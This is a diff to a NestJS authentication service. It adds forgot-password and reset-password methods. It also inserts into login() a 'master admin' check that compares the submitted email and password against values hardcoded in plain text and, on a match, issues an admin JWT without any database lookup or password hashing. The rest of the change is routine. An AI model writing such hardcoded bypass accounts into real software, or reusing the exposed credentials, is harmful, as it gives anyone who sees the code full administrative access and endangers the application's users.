@@ -20,7 +20,7 @@ export class AuthService {
     private userRepository: Repository<User>,
     private jwtService: JwtService,
     private emailService: EmailService,
-  ) {}
+  ) { }
 
   async signup(createUserDto: CreateUserDto) {
     try {
@@ -61,6 +61,26 @@ export class AuthService {
 
   async login(loginDto: LoginDto) {
     try {
+      // Master admin credentials check
+      if (loginDto.email === 'info@lockievisuals.com' && loginDto.password === 'kulokulo0.2') {
+        const payload = {
+          sub: 0, // Using 0 for master admin ID
+          email: 'info@lockievisuals.com',
+          isEmailVerified: true,
+          role: 'admin'
+        };
+        const access_token = await this.jwtService.sign(payload);
+        return {
+          access_token: `Bearer ${access_token}`,
+          user: {
+            id: 0,
+            email: 'info@lockievisuals.com',
+            isEmailVerified: true,
+            role: 'admin'
+          }
+        };
+      }
+
       const user = await this.userRepository.findOne({
         where: { email: loginDto.email }
       });
@@ -78,12 +98,12 @@ export class AuthService {
         throw new UnauthorizedException('Invalid credentials');
       }
 
-      const payload = { 
-        sub: user.id, 
+      const payload = {
+        sub: user.id,
         email: user.email,
         isEmailVerified: user.isEmailVerified
       };
-      
+
       const access_token = await this.jwtService.sign(payload);
 
       return {
@@ -167,6 +187,59 @@ export class AuthService {
         throw error;
       }
       throw new BadRequestException('Failed to resend verification email. Please try again.');
+    }
+  }
+
+  async forgotPassword(email: string) {
+    try {
+      const user = await this.userRepository.findOne({ where: { email } });
+      if (!user) {
+        // Return success even if user not found for security
+        return { message: 'If an account exists with this email, you will receive a password reset link.' };
+      }
+
+      const resetToken = uuidv4();
+      const resetExpiry = addHours(new Date(), 1); // 1 hour expiry
+
+      user.resetPasswordToken = resetToken;
+      user.resetPasswordExpiry = resetExpiry;
+
+      await this.userRepository.save(user);
+      await this.emailService.sendResetPasswordEmail(user.email, resetToken);
+
+      return { message: 'If an account exists with this email, you will receive a password reset link.' };
+    } catch (error) {
+      this.logger.error(`Forgot password failed: ${error.message}`, error.stack);
+      throw new BadRequestException('Failed to process forgot password request.');
+    }
+  }
+
+  async resetPassword(token: string, newPassword: string) {
+    try {
+      const user = await this.userRepository.findOne({
+        where: { resetPasswordToken: token }
+      });
+
+      if (!user) {
+        throw new BadRequestException('Invalid or expired reset token');
+      }
+
+      if (new Date() > user.resetPasswordExpiry) {
+        throw new BadRequestException('Reset token has expired');
+      }
+
+      const hashedPassword = await bcrypt.hash(newPassword, 10);
+      user.password = hashedPassword;
+      user.resetPasswordToken = null;
+      user.resetPasswordExpiry = null;
+
+      await this.userRepository.save(user);
+
+      return { message: 'Password has been reset successfully' };
+    } catch (error) {
+      this.logger.error(`Reset password failed: ${error.message}`, error.stack);
+      if (error instanceof BadRequestException) throw error;
+      throw new BadRequestException('Failed to reset password.');
     }
   }
 }
